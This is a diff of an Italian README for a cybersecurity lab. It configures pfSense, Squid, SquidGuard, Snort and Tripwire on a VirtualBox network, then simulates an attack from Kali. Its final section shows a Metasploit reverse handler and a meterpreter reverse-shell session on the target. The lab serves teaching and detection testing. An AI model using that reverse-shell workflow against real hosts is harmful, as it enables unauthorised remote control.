@@ -1,7 +1,7 @@
 
 
-# Progetto Advanced Cybersecurity
-Il seguente repository ha lo scopo di illustrare come configurare una rete di macchine virtuali, al fine di testare alcuni software legati alla sicurezza informatica. L' architettura viene riportata in figura.
+# ProjectAdvancedCybersecurity
+Il seguente repository ha lo scopo di illustrare come implementare un'infrastruttura di macchine virtuali, al fine di testare alcuni software legati alla sicurezza informatica. L' architettura da implementare viene riportata in figura.
 
 ![Architettura](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Screened-Network.drawio.png)
 
@@ -10,16 +10,13 @@ Le macchine virtuali sono le seguenti:
  - **Attacker**: Kali 2023.1 (con installato *python3*)
  - **Firewall**: Pfsense 2.6.0 (con i pacchetti *Squid* e *Snort*)
 
-Per quest'attività è stata configurata una rete interna a VirtualBox: `172.16.0.0 / 24` separata da quella domestica: `192.168.1.0 / 24`.
-Per fare ciò sono state configurate inizialmente le schede di rete virtuali delle macchine, "implementano" dispositivi fisici emulati dal virtualizzatore. La configurazione è la seguente: 
+Per quest'attività è stata configurata una rete interna a VirtualBox: `172.16.0.0 / 24` separata da quella domestica: `192.168.1.0 / 24`. Sono state configurate inizialmente le schede di rete virtuali delle macchine: 
 
- - **Target**: una scheda di rete in modalità *rete interna* (con alias "*intnet*")
- - **Kali**: una scheda di rete in modalità *bridge*
- - **Pfsense**: una scheda di rete in modalità *rete interna* (con alias "*intnet*"); un'altra in modalità *bridge* 
+ - **scheda Ubuntu:** *rete interna* (con alias "*intnet*")
+ - **scheda Kali**:  *bridge*
+ - **scheda 1 Pfsense**: *bridge*; **scheda 2 Pfsense**: *rete interna* (con alias "*intnet*").
  
- Gli adattatori di VirtualBox in modalità *bridge* essenzialmente permettono di porre le macchine virutali allo stesso livello di rete delle macchine nella rete domestica. Dall'altra parte la modalità *rete interna* crea una sottorete con uno spazio di indirizzamento differente.
-
-Gli indirizzi IPv4 delle interfacce sono stati assegnati automaticamente da VirtualBox, ad eccezione di quelli appartenenti alla rete virtuale interna che sono stati configurati tramite il server DHCP di Pfsense (come verrrà illustrato). L'indirizzamento è riportato nella tabella sottostante.
+L'indirizzamento è riportato nella tabella sottostante.
 
 |VM  |IPv4 |Gateway |
 |--|--|--|
@@ -29,12 +26,15 @@ Gli indirizzi IPv4 delle interfacce sono stati assegnati automaticamente da Virt
  
 Facendo ciò è stata implementata una rete fedele all'architettura mostrata sopra. 
 Di seguito verranno esplicitati tutti i passi di configurazione degli strumenti e per la simulazione di scenari di attacco
-> Nota: gli indirizzi di Kali e dell'interfaccia WAN di Pfsense essendo attribuiti in modo dinamico dal router domestico potrebbero variare ad ogni avvio delle macchine.
+
+> Nota: la relazione dettagliata è disponibile nel repository.
+
+> Nota: gli indirizzi assegnati dinamicamente potrebbero variare ad ogni avvio delle macchine.
 
 ## Configurazione
 Il primo componente inserito all'interno della reta è Pfsense, una distribuzione firewall open-source basata sul sistema operativo FreeBSD. Una volta avviata e configurata la macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN (la rete virtuale interna). Per impostarlo basterà attivare il menù `2) Set interface(s) IP address` e successivamente selezionare l'interfaccia LAN (nel caso in questione la numero `2`).  Una volta configurato l'indirizzo IPv4 dell'interfaccia come `172.16.0.1/24` è stato abilitato anche il server DHCP con il seguente range di indirizzi: `172.16.0.50 - 172.16.0.52` (questo operazione eviterà successivamente di impostare manualmente l'indirizzo della macchina `Ubuntu`). 
 
-![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/PfSense%20menu.png)
+![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Pfsense%20menu.png)
 
 Dalla macchina  `Ubuntu` attraverso un qualsiasi web browser sarà possibile accedere alla GUI per la configurazione di Pfsense (`http://172.16.0.1`) inserendo le credenziali di default: 
 
@@ -46,15 +46,15 @@ Dalla macchina  `Ubuntu` attraverso un qualsiasi web browser sarà possibile acc
  Una volta finita la configurazione iniziale è stato necessario rendere visibile la macchina `Ubuntu` da `Kali`. Essendo su due segmenti di rete differenti è stato necessario creare un *VirtualIP* da mappare con l'indirizzo di `Ubuntu`.  Nello specifico:
  
  1. dal menù **Firewall > VirtualIP**: aggiungere un nuovo VirtualIP di tipo Alias: `192.168.1.51/32`
- 2. dal menù ****Firewall > NAT** , scheda **1:1****: aggiungere un nuovo mapping sull'interfaccia WAN tra l'host esterno `192.168.1.51/32` e quello interno `172.16.0.50`
+ 2. dal menù **Firewall > NAT** , scheda **1:1**: aggiungere un nuovo mapping sull'interfaccia WAN tra l'host esterno `192.168.1.51/32` e quello interno `172.16.0.50`
 
 Con questa configurazione ogni volta che `Kali` effettuerà ad esempio un operazione di `ping`verso l'IP `192.168.1.51` verrà ridiretta  da Pfsense  verso l'IP interno `172.16.0.50`.
 
   ### 2. Regole del Firewall su Pfsense
   ----------
-  Nonostante l'operazione precedente la comunicazione tra  `Kali` e `Ubuntu` viene impedita da una regola di default del Firewall che blocca le comunicazioni con indirizzi **RFC 1918** (quindi anche la famiglia `192.168.0.0  –  192.168.255.255`) . Questa può essere disabilitata dal menù **Firewall > Rules** premendo sull'ingranaggio e deselezionando la voce alla fine del menù in cui si è ridiretti.
+  Nonostante questo, la comunicazione tra  `Kali` e `Ubuntu` viene impedita da una regola di default del Firewall che blocca le comunicazioni con indirizzi **RFC 1918** (quindi anche la famiglia `192.168.0.0  –  192.168.255.255`) . Questa può essere disabilitata dal menù **Firewall > Rules** scheda **WAN** premendo sull'ingranaggio e deselezionando la voce alla fine del menù in cui si è ridiretti.
   
-  ![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/block%20rule.png)
+  ![block rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/block%rule.png)
 
 Infine sono state aggiunte due regole per far passare il traffico da `Kali` verso `Pfsense` e `Ubuntu` 
 
@@ -62,12 +62,12 @@ Infine sono state aggiunte due regole per far passare il traffico da `Kali` vers
 
 ### 3. Squid e SquidGuard su Pfsense
   ----------
- Dal **Package Manager** di `Pfsense` sono stati installati i pacchetti `squid` , `squidGuard`. Entrambi sono stati usati con la funzione di filtrare il traffico *HTTP* della macchina `Ubuntu`.  Dal menù  **Services > Squid Proxy Server** è possibile abilitare il servizio e configurarlo. La configurazione adottata è la seguente:
+ Dal **Package Manager** di `Pfsense` sono stati installati i pacchetti `squid` e `squidGuard`. Entrambi sono stati usati con la funzione di filtrare il traffico *HTTP* della macchina `Ubuntu`.  Dal menù  **Services > Squid Proxy Server** è possibile abilitare il servizio e configurarlo. La configurazione adottata è la seguente:
  
 
  - **Interface**: LAN
  - **Proxy Port**: 3128
- - **Transparent Mode**: off (non abilitata solo ai fini di visualizzare una pagina di errore in modalità `int error page`)
+ - **Transparent Mode**: off (non abilitata solo ai fini di visualizzare una pagina di errore in modalità `int error page`; con la modalità transparent non è possibile)
 
  > Nota 1: le voci non elencate sono state lasciate con le opzioni di default
  
@@ -75,16 +75,15 @@ Infine sono state aggiunte due regole per far passare il traffico da `Kali` vers
 
 Come ultimo passo andare su **Services > SquidGuard Proxy Filter**:
 
- - scheda **Target Categories**: è stata creata una categoria si siti da bloccare denominata `Siti Bloccati` nella quale è stato inserito il dominio `facebook.com`; bloccandone l'accesso e impostando come *Redirect mode* `int error page` (con annesso messaggio di errore) .
+ - scheda **Target Categories**: è stata creata una categoria di siti da bloccare denominata `Siti Bloccati` nella quale è stato inserito il dominio `facebook.com` impostando come *Redirect mode* `int error page` (con annesso messaggio di errore) .
  - scheda **General Settings**: oltre ad abilitare il servizio,
    selezionare anche l'opzione *Blacklist* inserendo il seguente URL:
    `https://dsi.ut-capitole.fr/blacklists/download/blacklists_for_pfsense.tar.gz`.
  - scheda **Blacklist**: attraverso il link precedente sarà
-   possibile scaricare un'elenco di siti categorizzati per filtrare
-   determinate categorie di siti web (come verrà illustrato in seguito).
- - scheda **Common ACL**:  è possibile estendere la `Target Rule List` da cui è stato bloccato l'accesso ai siti di apparteneti alla categoria `webmail` e alla categoria `Siti bloccati` creata precedentemente (l'opzione di *Redirect Mode* è la medesima). Per la categoria *Default Access [all]* ossia per tutti gli altri siti è stato concesso il permesso.
+   possibile scaricare un'elenco di siti divisi in categorie (come verrà illustrato in seguito).
+ - scheda **Common ACL**: estendere `Target Rule List` in cui è stato bloccato l'accesso ai siti appartenenti alla categoria `webmail` e alla categoria `Siti bloccati` creata precedentemente (l'opzione di *Redirect Mode* è la medesima). Per la categoria *Default Access [all]* ossia per tutti gli altri siti è stato concesso il permesso.
 
-Una volta salvate e applicate le regole i due servizi "gireranno" all'unisono e nella sezione dei **Test** verranno illustrati i risutati
+Una volta salvate e applicate le regole i due servizi "gireranno" all'unisono e nella sezione dei **Test** verranno illustrati i risultati.
 
   
 ### 4. Snort su Pfsense
@@ -102,12 +101,12 @@ Come ultimo passo è stato avviato Snort sull'interfaccia sempre dalla scheda **
   
 ### 5. Tripwire su Ubuntu
   ----------
-  Nella macchina `target` la prima cosa da fare è installare Tripwire che ci permetterà di rilevare l'attacco compiuto dall'attaccante:
+  Nella macchina `Ubuntu` la prima cosa da fare è installare `Tripwire` che ci permetterà di rilevare l'attacco compiuto dall'attaccante:
 ```bash
 sudo apt-get update
 sudo apt-get install tripwire
 ```
-Lasciando inalterate le impostazioni di default, Tripwire ti chiederà di creare due chiavi:
+Lasciando inalterate le impostazioni di default, `Tripwire` ti chiederà di creare due chiavi:
 
 -   **site key** : questa chiave viene utilizzata per proteggere i file di configurazione. Dobbiamo assicurarci che i file di configurazione non vengano modificati, altrimenti non ci si può fidare del nostro intero sistema di rilevamento. 
     
@@ -115,16 +114,16 @@ Lasciando inalterate le impostazioni di default, Tripwire ti chiederà di creare
 
 >  Nota: assicurati di scegliere passphrase non facilmente deducibili
 
- ### 5.1 Inizializzare il database 
+ ###  Inizializzare il database 
 ----------
 
-Il primo step è inizializzare il database che tripwire utilizzerà per convalidare il sistema. Questo utilizza il file delle policy e controlla i punti specificati all'interno. Poiché il file di default non è stato ancora personalizzato per il nostro sistema, avremo molti avvisi, falsi positivi ed errori. Per inizializzare il database eseguire:
+Il primo step è inizializzare il database che `Tripwire` utilizzerà per convalidare il sistema. Questo utilizza il file delle policy e controlla i punti specificati all'interno. Poiché il file di default non è stato ancora personalizzato per il nostro sistema, avremo molti avvisi, falsi positivi ed errori. Per inizializzare il database eseguire:
 
 ```bash
 sudo tripwire --init
 ```
 
-Questo creerà il nostro file di database e genererà dei *warnings* che dobbiamo regolare nella configurazione.  Eseguire il comando `check` e posizionare l'output in un file chiamato `test_results` contenuto nella nostra directory di configurazione di tripwire (`etc/tripwire`):
+Questo creerà il nostro file di database e genererà dei *warnings* che dobbiamo regolare nella configurazione.  Eseguire il comando `check` e posizionare l'output in un file chiamato `test_results` contenuto nella nostra directory di configurazione di `Tripwire` (`etc/tripwire`):
 
 ```bash
 cd etc/tripwire
@@ -143,7 +142,7 @@ Filename: /root/Mail
 Filename: /root/.xsession-errors
 . . .
 ```
- ### 5.2 Configurazione file delle policy 
+ ###  Configurazione file delle policy 
 ----------
 
 Ottenuto questo elenco si deve esaminare il file di policy e modificarlo per eliminare questi falsi positivi. Aprire il file *twpol.txt* nell' editor con i privilegi di root:
@@ -159,7 +158,7 @@ Eseguire una ricerca per ciascuno dei file restituiti in`test_results`, commenta
 
 ![rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20rule.png)
 
-Salvato e chiuso il file è configurato. Successivamente si dovrà ricreare il file di policy crittografato che tripwire effettivamente leggerà:
+Salvato e chiuso il file è configurato. Successivamente si dovrà ricreare il file di policy crittografato che `Tripwire` effettivamente leggerà:
 
 ```bash
 sudo twadmin -m P /etc/tripwire/twpol.txt
@@ -223,7 +222,7 @@ msf6 exploit(multi/handler) > exploit
 [*] Started reverse handler on 192.168.1.23:4444
 [*] Starting the payload handler...
 ```
-Una volta che la macchina `Ubuntu` avrà scaricato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina `Kali` di compiere l'attacci. Come esempio è stato eseguito un cambio di permessi ad una cartella:
+Una volta che la macchina `Ubuntu` avrà scaricato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina `Kali` di compiere l'attacco. Come esempio è stato eseguito un cambio di permessi ad una cartella:
  ```bash
 meterpreter > chmod o+x ./Target
 ```
